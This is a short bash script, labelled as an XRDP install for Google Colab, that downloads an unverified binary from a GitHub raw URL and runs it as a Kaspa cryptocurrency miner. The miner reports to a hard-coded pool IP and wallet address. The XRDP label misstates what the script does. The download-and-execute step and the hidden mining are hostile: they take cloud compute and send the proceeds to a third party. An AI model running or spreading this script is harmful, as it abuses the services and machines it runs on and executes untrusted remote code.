# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=178.128.86.41:80
WALLET=kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
